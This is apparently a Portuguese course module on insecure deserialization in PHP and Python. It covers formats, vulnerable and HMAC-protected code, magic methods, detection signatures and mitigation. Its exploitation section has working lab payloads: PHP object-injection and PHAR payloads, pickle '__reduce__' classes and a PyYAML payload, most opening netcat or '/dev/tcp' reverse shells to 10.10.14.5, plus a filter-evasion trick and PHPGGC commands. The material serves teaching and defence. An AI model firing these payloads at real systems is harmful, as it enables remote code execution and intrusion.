---
title: "Deserialization — Intro"
---

# Deserialization Attacks — Introdução (PHP e Python)

# O que é?

Serialização é o processo de converter um objeto ou estrutura de dados em memória para um formato
transmissível ou armazenável — bytes, texto, XML, JSON, binário proprietário. Desserialização é
o processo inverso: reconstruir o objeto original a partir desse formato.

Cada linguagem de programação oferece mecanismos nativos de serialização com características
próprias de segurança:

| Linguagem  | Mecanismo Nativo         | Formato de Saída          |
|------------|--------------------------|---------------------------|
| PHP        | serialize() / unserialize() | String de texto estruturada |
| Python     | pickle.dumps() / pickle.loads() | Bytecode binário proprietary |
| Java       | ObjectOutputStream / ObjectInputStream | Bytecode binário (magic: AC ED) |
| .NET/C#    | BinaryFormatter          | Binário proprietário      |
| Ruby       | Marshal.dump / Marshal.load | Binário proprietário    |

Além dos formatos nativos, existem formatos portáveis e interoperáveis:

| Formato      | Natureza               | Executa Código? | Uso Típico                   |
|--------------|------------------------|-----------------|------------------------------|
| JSON         | Texto (chave-valor)    | Nao             | APIs REST, configuracao      |
| XML          | Texto (marcacao)       | Nao             | SOAP, configuracao legada    |
| YAML         | Texto (hierarquico)    | Depende do loader | Config, CI/CD pipelines    |
| MessagePack  | Binario compacto       | Nao             | Alta performance, IoT        |
| Protobuf     | Binario schema-first   | Nao             | gRPC, microservicos          |
| pickle       | Bytecode Python        | SIM             | Uso interno Python           |
| PHP serialize| String estruturada     | SIM (via magic methods) | Sessoes PHP legadas |

A diferenca critica esta na ultima coluna: formatos nativos como pickle e PHP serialize executam
codigo durante a desserializacao porque precisam reconstruir objetos com comportamentos (metodos),
nao apenas dados inertes. Formatos como JSON e Protobuf sao schema-validados — eles carregam apenas
dados, sem comportamentos executaveis.

O principio fundamental de seguranca: NUNCA desserializar dados nao confiáveis usando formatos
nativos de linguagem (pickle, PHP serialize, Java ObjectInputStream, Ruby Marshal). Formatos seguros
como JSON devem ser usados para qualquer dado que cruze limites de confianca.

# Onde é implementado?

Serialização e desserialização aparecem em praticamente todos os sistemas web modernos:

**Caching distribuido:**
Redis e Memcached armazenam objetos serializados para evitar consultas repetidas ao banco de dados.
Um objeto Python complexo com metodos e estado pode ser serializado via pickle, armazenado em Redis,
e desserializado na proxima requisicao. Se o cache for compartilhado ou acessivel externamente, o
vetor de ataque existe.

**Message Queues e sistemas de mensageria:**
RabbitMQ, Kafka e Celery transmitem tarefas entre servicos como payloads serializados. Um worker
Celery Python que processa tarefas do Redis usa pickle internamente por padrao — qualquer tarefa
injetada na fila sera desserializada com privilégios do worker.

**Sessoes HTTP:**
PHP armazena sessoes como strings serializadas em arquivos no servidor (session_save_path). O ID da
sessao no cookie aponta para o arquivo — a manipulacao direta do arquivo de sessao pelo atacante
resulta em desserializacao maliciosa.

**APIs e troca de dados:**
JSON e a forma mais comum de serialização em APIs REST. APIs GraphQL usam JSON. SOAP usa XML. A
desserializacao de JSON e segura por padrao desde que nao use TypeNameHandling (em .NET) ou
construtores customizados que executem logica.

**ORMs e mapeamento objeto-relacional:**
Django, SQLAlchemy e Hibernate serializam objetos para armazenamento. Campos do tipo pickle no
Django (PickledObjectField de terceiros) sao vetores conhecidos.

**Cookies de estado:**
Aplicacoes que armazenam estado do usuario em cookies — carrinho, preferencias, sessao — frequentemente
serializam esses dados. Flask-Session com backend de cookie usa itsdangerous, mas implementacoes
customizadas podem usar pickle diretamente.

**WebSockets:**
Payloads de mensagens em conexoes WebSocket sao frequentemente serializados. Frameworks como
Socket.io usam JSON, mas implementacoes customizadas podem usar formatos binarios.

**Import e export de dados:**
Funcionalidades de exportar/importar configuracoes, perfis de usuario, ou dados de aplicacao
frequentemente usam serialização. O arquivo exportado sai do servidor, vai para o usuario, e ao
ser reimportado, e desserializado — esse ciclo e um vetor classico.

# Como funciona de forma adequada?

Em um fluxo correto, a serialização converte dados de memoria para um formato persistivel e a
desserializacao reconstroe esses dados de forma controlada e validada.

**Ciclo completo de serialização Python com pickle (uso interno):**

```
+------------------+         +------------------+         +------------------+
|  Objeto Python   |         |  Bytes binarios  |         |  Objeto Python   |
|                  |         |                  |         |                  |
|  user = {        |         |  \x80\x04\x95    |         |  user = {        |
|    "id": 42,     |  -----> |  \x15\x00\x00\x00|  -----> |    "id": 42,     |
|    "name": "Ana" |         |  \x8c\x04user... |         |    "name": "Ana" |
|  }               |         |  (bytes opacos)  |         |  }               |
+------------------+         +------------------+         +------------------+
    pickle.dumps()           transmitido/armazenado          pickle.loads()
```

**Ciclo correto em Python — pickle para cache interno com dados confiaveis:**

```python
import pickle
import redis

# Conexao Redis interna (nunca exposta externamente)
cache = redis.Redis(host='localhost', port=6379, db=0)

def get_user_from_cache(user_id: int):
    key = f"user:{user_id}"
    cached = cache.get(key)
    if cached:
        # SEGURO: o dado veio do nosso proprio backend, nao do usuario
        return pickle.loads(cached)
    user = db.query(User).filter_by(id=user_id).first()
    cache.setex(key, 300, pickle.dumps(user))
    return user
```

A chave de segurança nesse exemplo: o dado em cache foi gerado pelo proprio backend. O usuario
nunca toca nesses bytes. O pickle e usado apenas para dados internos.

**Ciclo correto em PHP — json_encode/decode para dados externos:**

```php
<?php
// CORRETO: JSON para qualquer dado que cruze fronteiras de confianca
$user_data = [
    'id' => $user->id,
    'name' => $user->name,
    'role' => $user->role
];

// Serializar para cookie
$cookie_value = base64_encode(json_encode($user_data));
setcookie('user_info', $cookie_value, time() + 3600, '/', '', true, true);

// Desserializar do cookie
$decoded = json_decode(base64_decode($_COOKIE['user_info']), true);
// JSON nao executa codigo — seguro para dados externos
```

**Ciclo correto em Java — Jackson ObjectMapper para JSON:**

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;

ObjectMapper mapper = new ObjectMapper();
// CRITICO: desabilitar inclusao de informacao de tipo
mapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
// Nunca usar: mapper.enableDefaultTyping()

// Serializar
String json = mapper.writeValueAsString(userObject);

// Desserializar — tipo fixo, nunca derivado do input
UserModel user = mapper.readValue(json, UserModel.class);
```

**Diagrama comparativo — formato seguro vs. nativo:**

```
FORMATO SEGURO (JSON)                    FORMATO NATIVO (pickle/PHP serialize)
+-----------------------------+          +------------------------------------+
|  {"id": 42, "name": "Ana"} |          |  O:4:"User":2:{s:2:"id";i:42;...} |
|                             |          |                                    |
|  Desserializar:             |          |  Desserializar:                    |
|  1. Parsear chave-valor     |          |  1. Identificar classe "User"      |
|  2. Retornar dict/hashmap   |          |  2. Instanciar objeto              |
|  3. NENHUM codigo executado |          |  3. Executar __wakeup()            |
|                             |          |  4. Executar __destruct() no fim   |
|  Beneficios:                |          |                                    |
|  - Schema validavel         |          |  Risco:                            |
|  - Interoperavel            |          |  - Codigo executado implicitamente |
|  - Auditavel                |          |  - Classe pode ser qualquer uma    |
+-----------------------------+          |    disponivel no classpath         |
                                         +------------------------------------+
```

**Beneficios de usar formatos seguros:**

1. Previsibilidade: JSON retorna apenas dados, nunca comportamentos.
2. Validacao de schema: ferramentas como jsonschema (Python) ou Joi (Node.js) validam estrutura.
3. Interoperabilidade: qualquer linguagem le JSON sem dependencias especiais.
4. Auditoria: logs de JSON sao legiveis por humanos.
5. Defesa em profundidade: mesmo que o dado seja manipulado, nao ha codigo a executar.

**Principio de ouro:**
- Dados internos (cache, fila interna, IPC): pickle/formatos nativos sao aceitaveis se o dado
  NUNCA foi tocado pelo usuario.
- Dados que cruzam fronteiras de confianca (cookies, APIs, upload de arquivo, parametros HTTP):
  SEMPRE usar JSON, XML validado, ou Protobuf. Nunca usar pickle ou PHP serialize.

---

## A Falha: Dados Serializados Reconstruídos em Objetos Sem Validação de Tipo ou Conteúdo

Serialização é o processo de converter um objeto em memória para um formato transmissível (string, bytes) que pode ser armazenado ou enviado pela rede. Desserialização é o inverso: reconstruir o objeto a partir desses dados.

A suposição de design errada: o desenvolvedor trata dados serializados como "apenas dados salvos" — uma representação inerte de um estado anterior. Mas a runtime não compartilha essa visão. Para a runtime, desserializar significa reconstruir um objeto vivo, com métodos, e executar callbacks automáticos durante essa reconstrução.

**Perspectiva do desenvolvedor vs. da runtime:**

O desenvolvedor pensa: "estou salvando o carrinho do usuário como base64 no cookie, e depois vou restaurá-lo". A runtime pensa: "recebi um objeto PHP/Python, vou reconstruí-lo e chamar `__wakeup()`, `__destruct()`, `__reduce__()` conforme a classe determinar".

O atacante não explora uma injeção clássica — não está injetando SQL nem comandos de shell diretamente. Ele fornece um objeto legítimo, de uma classe que já existe no código da aplicação, com propriedades manipuladas que levam o runtime a executar código arbitrário ao reconstruir o objeto.

Uma aplicação Flask que usa `pickle.loads()` na rota de checkout ilustra esse padrão: o backend deserializa o `cartData` enviado pelo cliente sem validar se foi o próprio backend que gerou aquele dado. Qualquer objeto pickle forjado pelo atacante será reconstruído com a mesma autoridade que o original.

**Consequência antes de ver a exploração:** se a aplicação desserializa input controlado pelo usuário, o atacante pode acionar métodos que o desenvolvedor nunca chamaria explicitamente — levando a RCE, escalada de privilégios, bypass de autenticação ou exfiltração de dados.

O OWASP classifica deserialização insegura como uma das 10 vulnerabilidades mais críticas em aplicações web.

Impactos documentados:
- RCE sem autenticação via cookie manipulado
- Escalada de privilégios de usuário comum para admin
- Bypass de autenticação via manipulação de objeto serializado
- Exfiltração de dados internos via SSRF encadeado

---

## Causa Raiz

A vulnerabilidade nasce no momento em que dados controlados pelo usuário chegam a uma função de desserialização sem validação de integridade.

### Código Vulnerável vs. Seguro (Python/Pickle)

O padrão vulnerável abaixo ilustra o problema:

```python
# VULNERAVEL — deserializa diretamente o input do usuario
import pickle, base64

@app.route('/checkout', methods=['POST'])
def checkout():
    cart_data = request.form.get('cartData')
    # O que falta: verificar se cartData foi gerado pelo proprio backend
    cart = pickle.loads(base64.b64decode(cart_data))  # <- ponto de explosao
    process_order(cart)
```

O que falta aqui é validação de integridade. O backend não assina o dado ao serializar, logo não pode verificar se foi ele quem gerou o dado ao desserializar.

```python
# SEGURO — assinar com HMAC antes de enviar; verificar antes de desserializar
import hmac, hashlib, pickle, base64

SECRET_KEY = "chave-secreta-forte"  # na pratica: variavel de ambiente

def sessionToCookie(session):
    pickled = pickle.dumps(session)
    hmac_calculated = hmac.new(
        SECRET_KEY.encode(),
        pickled,
        hashlib.sha512
    ).digest()
    cookie = base64.b64encode(pickled) + b'.' + base64.b64encode(hmac_calculated)
    return cookie

def cookieToSession(cookie):
    parts = cookie.split(b'.')
    pickled = base64.b64decode(parts[0])
    provided_hmac = base64.b64decode(parts[1])

    expected_hmac = hmac.new(
        SECRET_KEY.encode(),
        pickled,
        hashlib.sha512
    ).digest()

    if not hmac.compare_digest(provided_hmac, expected_hmac):
        raise ValueError("HMAC invalido — possivel manipulacao!")

    return pickle.loads(pickled)
```

### O que falta em cada linguagem

**PHP — `unserialize()` sem restrição de classes:**

```php
// VULNERAVEL — unserialize aceita qualquer classe do classpath
$obj = unserialize(base64_decode($_COOKIE['settings']));

// SEGURO — permitlist de classes aceitas
$obj = unserialize(base64_decode($_COOKIE['settings']), [
    'allowed_classes' => ['UserPreferences']
]);

// MELHOR — usar JSON em vez de serialize/unserialize
$data = json_decode(base64_decode($_COOKIE['settings']), true);
```

**Python — alternativas sem desserialização de objetos:**

```python
# Em vez de pickle, usar JSON com schema validation
import json, jsonschema

schema = {
    "type": "object",
    "properties": {
        "product_id": {"type": "integer"},
        "quantity": {"type": "integer", "minimum": 1, "maximum": 100}
    },
    "required": ["product_id", "quantity"],
    "additionalProperties": False
}

data = json.loads(user_input)
jsonschema.validate(data, schema)  # lanca excecao se invalido
```

---

## Mecanismo de Execução de Código via Magic Methods e __reduce__

### Serialização e Desserialização

Serialização converte objetos em memória para um formato transmissível (string, bytes). Desserialização faz o inverso — reconstrói o objeto a partir do dado serializado.

O problema central: durante a reconstrução do objeto, o runtime executa métodos especiais do objeto sem que o desenvolvedor perceba.

### Formato Serializado PHP

```
a:3:{i:0;s:3:"HTB";i:1;i:123;i:2;d:7.77;}
```

Legenda:
- `a:N:{...}` — array com N elementos
- `i:N` — integer N
- `s:N:"valor"` — string de N bytes
- `d:7.77` — float
- `b:1` — boolean true
- `N;` — null
- `O:N:"ClassName":N:{...}` — objeto de classe ClassName com N propriedades

Exemplo de objeto serializado:

```php
O:4:"User":2:{s:8:"username";s:5:"admin";s:6:"active";b:1;}
```

Para serializar/desserializar em PHP:

```php
$data = serialize($object);
$object = unserialize($data);
```

### Magic Methods PHP

Magic methods são invocados automaticamente pelo runtime em eventos específicos do ciclo de vida do objeto. São o mecanismo central de exploração em PHP Object Injection:

| Magic Method | Quando é invocado |
|---|---|
| `__construct()` | Criação do objeto |
| `__destruct()` | Destruição do objeto (fim de request) |
| `__wakeup()` | Imediatamente após `unserialize()` |
| `__sleep()` | Imediatamente antes de `serialize()` |
| `__toString()` | Objeto usado como string |
| `__call()` | Método inacessível chamado em instância |
| `__callStatic()` | Método inacessível chamado estaticamente |
| `__get()` | Leitura de propriedade inacessível |
| `__set()` | Escrita em propriedade inacessível |
| `__isset()` | `isset()` em propriedade inacessível |
| `__unset()` | `unset()` em propriedade inacessível |
| `__invoke()` | Objeto usado como função |
| `__clone()` | Após `clone $objeto` |
| `__set_state()` | `var_export()` com reconstituição |
| `__debugInfo()` | `var_dump()` |
| `__serialize()` | PHP 8+ substitui `__sleep()` |
| `__unserialize()` | PHP 8+ substitui `__wakeup()` |

Os mais explorados em ataques: `__wakeup()`, `__destruct()`, `__toString()`.

### Pickle (Python)

Pickle é o módulo padrão de serialização Python. Suporta protocolos 0 a 5.

```python
import pickle, base64

# Serializar
data = pickle.dumps(objeto)

# Deserializar
objeto = pickle.loads(data)
```

Magic bytes do protocolo 4 (mais comum): `80 04 95` (hex)

O método especial explorado é `__reduce__`:

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ("comando",))
```

Quando o pickle desserializa um objeto que implementa `__reduce__`, ele chama a função retornada com os argumentos fornecidos — executando código arbitrário.

---

## Identificação

### PHP — Identificando Pontos de Desserialização

**1. Procurar chamadas a `unserialize()`:**

```bash
grep -r "unserialize(" /var/www/ --include="*.php"
```

**2. Identificar dados controlados pelo usuário sendo desserializados:**
- Cookies com dados codificados em base64
- Parâmetros GET/POST com estrutura `O:N:` ou `a:N:`
- Campos de formulários hidden contendo dados serializados
- Cabeçalhos HTTP customizados

**3. Testar se o endpoint aceita dados serializados:**

Dado base64 de um objeto serializado válido — se a aplicação responde normalmente, pode aceitar objetos arbitrários.

**4. Identificar classes disponíveis no código:**

```bash
grep -r "class " /var/www/ --include="*.php" | grep -E "__wakeup|__destruct|__toString"
```

**5. Decodificar cookies suspeitos:**

```bash
echo "TzozOiJGb28iOjA6e30=" | base64 -d
# Output: O:3:"Foo":0:{}
```

### Python — Identificando Endpoints Vulneráveis

**1. Endpoints que aceitam cookies ou parâmetros com dados binários ou base64**

**2. Magic bytes no cookie/parâmetro:**
- Protocol 0: texto puro começando com `(`
- Protocol 2: `\x80\x02`
- Protocol 4: `\x80\x04\x95`

**3. Decode de cookie suspeito:**

```python
import base64, pickle
data = base64.b64decode("gASVIAAAAAAAAACMCF9fbWFpbl9flIwDUkNFlJOUKYGUh5Qu")
print(data)
```

**4. Bibliotecas que usam pickle internamente:**
- `flask-session` (dependendo da configuração)
- `shelve`
- `joblib`
- `sklearn` (modelos serializados)

### PHAR (PHP Archive) — Vetor Indireto

PHAR é um formato de arquivo PHP que contém metadados serializados. Qualquer função que opere em arquivos pode triggerar desserialização quando recebe um path `phar://`.

Funções vulneráveis (PHP menor que 8.0 por padrão):
- `file_exists()`
- `is_file()`
- `file_get_contents()`
- `copy()`
- `rename()`
- `fopen()`
- `include()` / `require()`

Identificar upload de arquivos + operações sobre o arquivo que usam o nome fornecido pelo usuário.

---

## Exploitation

### PHP — Object Injection via `__wakeup()`

**Cenário HTBank:** A aplicação serializa configurações do usuário e as armazena em base64 num cookie `settings`. No import/export, o campo é desserializado sem validação.

A classe `UserSettings` tem `__wakeup()` que executa `shell_exec($this->theme)`.

**Passo 1 — Identificar a classe vulnerável:**

```php
class UserSettings {
    public $username;
    public $email;
    public $password;
    public $theme;

    public function __wakeup() {
        shell_exec("set_theme " . $this->theme);
    }
}
```

**Passo 2 — Criar payload serializado com RCE:**

```php
<?php
require_once 'vendor/autoload.php';

$payload = new \App\Helpers\UserSettings(
    '"; nc -nv 10.10.14.5 9999 -e /bin/bash;#',
    'attacker@evil.com',
    '$2y$10$fakehash',
    'default.jpg'
);

echo base64_encode(serialize($payload));
?>
```

**Passo 3 — Substituir o cookie e importar:**

```
Cookie: settings=TzozNjoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntcInVzZXJuYW1lXCI7czozOToiXCI7...
```

**Listener:**

```bash
nc -lvnp 9999
```

### PHP — PHAR Deserialization

Quando a aplicação faz operações de arquivo sobre um path controlado pelo usuário:

**Passo 1 — Criar PHAR com payload nos metadados:**

```php
<?php
// Requer php.ini: phar.readonly = 0
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");

// Inject objeto malicioso nos metadados
$phar->setMetadata(new \App\Helpers\UserSettings(
    '"; nc -nv 10.10.14.5 9999 -e /bin/bash;#',
    'attacker@evil.com',
    '$2y$10$fakehash',
    'default.jpg'
));
$phar->stopBuffering();
rename("exploit.phar", "exploit.jpg");
?>
```

**Passo 2 — Upload do arquivo disfarçado**

**Passo 3 — Triggerar desserialização via path `phar://`:**

```
GET /profile.php?avatar=phar:///var/www/uploads/exploit.jpg HTTP/1.1
```

A chamada interna a `file_exists("phar:///var/www/uploads/exploit.jpg")` desserializa os metadados automaticamente.

### PHP — PHPGGC (Gerador de Gadget Chains)

PHPGGC é um repositório de gadget chains para frameworks populares. Funciona como o ysoserial do PHP.

```bash
# Listar gadget chains disponíveis para Laravel
phpggc -l Laravel

# Gerar payload base64 para RCE
phpggc Laravel/RCE9 system 'nc -nv 10.10.14.5 9999 -e /bin/bash' -b

# Gerar PHAR para PHAR deserialization
phpggc -p phar Laravel/RCE9 system 'nc -nv 10.10.14.5 9999 -e /bin/bash' -o exploit.phar
```

Frameworks suportados: Laravel, Symfony, Yii, Zend, WordPress, Drupal, Magento, CakePHP, Laminas, SwiftMailer, Monolog, entre outros.

### Python — Pickle RCE via `__reduce__`

**Cenário HTBooks:** O cookie `auth` contém uma sessão pickled em base64.

**Passo 1 — Verificar magic bytes do cookie:**

```python
import base64
cookie = "gASVIAAAA..."
data = base64.b64decode(cookie)
print(hex(data[0]), hex(data[1]))
# 0x80 0x4 = Protocol 4
```

**Passo 2 — Criar payload de RCE:**

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return os.system, ("ping -c 5 10.10.14.5",)

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
```

**Passo 3 — Substituir cookie e confirmar execução, depois shell reversa:**

```python
class RCE:
    def __reduce__(self):
        return os.system, ("nc -nv 10.10.14.5 9999 -e /bin/bash",)
```

### Python — Bypass de Blacklist

Se a aplicação bloqueia palavras como `nc` ou `bash`:

```python
class RCE:
    def __reduce__(self):
        # Inserir aspas vazias para quebrar a string sem alterar o comando
        return os.system, ("n''c -nv 10.10.14.5 9999 -e /bin/s''h",)
```

Shell com bash encoded em base64:

```python
import base64, os, pickle

cmd = "bash -i >& /dev/tcp/10.10.14.5/9999 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()

class RCE:
    def __reduce__(self):
        return os.system, (f"echo {b64}|base64 -d|bash",)
```

### Python — JSONPickle RCE

JSONPickle é uma biblioteca que serializa objetos Python para JSON. Internamente usa pickle, logo é igualmente vulnerável.

```python
import jsonpickle, os

class RCE:
    def __reduce__(self):
        return os.system, ("id > /tmp/pwned",)

# Gerar payload
exploit = jsonpickle.encode(RCE())
print(exploit)
# {"py/reduce": [{"py/function": "posix.system"}, {"py/tuple": ["id > /tmp/pwned"]}]}

# Confirmar execução
jsonpickle.decode(exploit)
```

### Python — PyYAML RCE

```python
import yaml, subprocess

# Payload YAML com execução de código
payload = """
!!python/object/apply:subprocess.Popen
- [nc, -nv, 10.10.14.5, 9999, -e, /bin/bash]
"""

yaml.load(payload, Loader=yaml.Loader)
```

Nota: `yaml.safe_load()` bloqueia este vetor. A vulnerabilidade existe quando `yaml.load()` é usado sem `Loader=yaml.SafeLoader`.

### PEAS — Ferramenta de Exploração Python

PEAS (Python Exploit Automation Suite) automatiza geração de payloads pickle:

```bash
# Instalar
pip3 install peas

# Gerar payload para RCE
peas -c "nc -nv 10.10.14.5 9999 -e /bin/bash"

# Gerar com protocolo específico
peas -p 2 -c "id"
```

---

## Ferramentas

### PHPGGC

```bash
# Instalação
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Listar todos os gadgets disponíveis
./phpggc -l

# Listar por framework
./phpggc -l Laravel
./phpggc -l Symfony

# Gerar payload base64 (pronto para cookie)
./phpggc Laravel/RCE9 system 'id' -b

# Gerar PHAR
./phpggc -p phar Laravel/RCE9 system 'id' -o exploit.phar

# Gerar com encoding URL
./phpggc Laravel/RCE9 system 'id' -u

# Gerar com wrapper JSON
./phpggc Laravel/RCE9 system 'id' -j
```

### Burp Suite

- Interceptar requests com cookies/parâmetros suspeitos
- Decoder Tab: Base64 decode para inspecionar dados serializados
- Repeater: Modificar e reenviar requests com payloads injetados
- Extensão "PHP Object Injection Check"

### Ferramentas de Inspeção PHP

```bash
# Decodificar objeto serializado
php -r "var_dump(unserialize(base64_decode('T...=')));"

# Verificar classes disponíveis numa aplicação
php -r "print_r(get_declared_classes());"

# Serializar objeto de teste
php -r "class Foo { public \$x = 'test'; } echo base64_encode(serialize(new Foo()));"
```

### Ferramentas Python

```python
# Inspecionar pickle sem executar (parcial)
import pickletools, io, base64

data = base64.b64decode("PAYLOAD_AQUI")
pickletools.dis(io.BytesIO(data))

# Verificar protocolo
print(f"Protocol: {data[1]}")
```

### Grep para Auditoria de Código

```bash
# PHP — funções de desserialização
grep -rn "unserialize\|__wakeup\|__destruct\|__toString" /var/www/ --include="*.php"

# PHP — operações de arquivo que podem aceitar phar://
grep -rn "file_exists\|is_file\|file_get_contents\|fopen\|include\|require" /var/www/ --include="*.php"

# Python — uso de pickle
grep -rn "pickle.loads\|pickle.load\|jsonpickle.decode\|yaml.load" /app/ --include="*.py"

# Python — uso de HMAC para proteção
grep -rn "hmac\|sha512\|sha256" /app/ --include="*.py"
```

---

## Detecção e Mitigação

### Indicadores de Serialização PHP em Requests

Reconhecer dados serializados PHP:
- Base64 com conteúdo decodificado começando com `O:`, `a:`, `s:`, `i:`
- Parâmetros com estrutura `O:N:"ClassName":N:{...}`
- Cookies com nomes como `settings`, `data`, `session`, `obj`, `payload`

```bash
# Detectar em logs Apache/Nginx
grep -E "O:[0-9]+:" /var/log/apache2/access.log
grep -E "a:[0-9]+:" /var/log/nginx/access.log
```

### Indicadores de Pickle Python

- Cookie ou parâmetro com bytes `\x80\x02`, `\x80\x03`, `\x80\x04`, `\x80\x05`
- Base64 decodificado com esses magic bytes
- Cookies com nomes como `auth`, `session`, `data`

### WAF/IDS Signatures

```
# Regra genérica para Object Injection PHP
O:[0-9]+:"[a-zA-Z]+":[0-9]+:\{

# Magic bytes pickle (URL encoded)
%80%04%95

# Gadget chains comuns (PHPGGC)
GuzzleHttp|Monolog|Symfony|Laravel.*RCE
```

### Mitigação por Linguagem

**PHP:**

```php
// Nunca usar unserialize() com dados do usuário
// Se necessário, usar lista branca de classes permitidas
$obj = unserialize($data, ['allowed_classes' => ['SafeClass']]);

// Preferir JSON para troca de dados
$data = json_decode($input, true);

// Assinar dados serializados com HMAC
$hmac = hash_hmac('sha256', $serialized, SECRET_KEY);
if (!hash_equals($hmac, $provided_hmac)) {
    die('Invalid signature');
}
```

**Python — alternativas seguras:**

```python
# Usar JSON em vez de pickle
import json
data = json.dumps(session_data)
session = json.loads(data)

# Para YAML, sempre usar safe_load
import yaml
data = yaml.safe_load(input_string)

# Para jsonpickle, desabilitar decode de tipos Python
import jsonpickle
jsonpickle.set_decoder_options('json', cls=None)
obj = jsonpickle.decode(data, safe=True)
```

### Monitoramento

```bash
# Monitorar execucoes suspeitas do servidor web
auditctl -a always,exit -F arch=b64 -S execve -F uid=www-data -k webshell

# Ver eventos auditd
ausearch -k webshell -ts recent

# Monitorar conexoes de saida do processo web
ss -tulpn | grep apache2
netstat -tulpn | grep php-fpm
```

---

## Módulos Relacionados

`02_deserialization_avancado.md` aprofunda gadget chains e cobre desserialização em .NET/C#, incluindo BinaryFormatter e ysoserial.net. `11_apis_avancado/01_rest_api_attacks.md` mostra como APIs REST expõem endpoints de desserialização via JSON com TypeNameHandling inseguro. `10_http_attacks/02_http_misconfigs.md` explica como cookies manipulados chegam ao servidor e são desserializados sem validação.
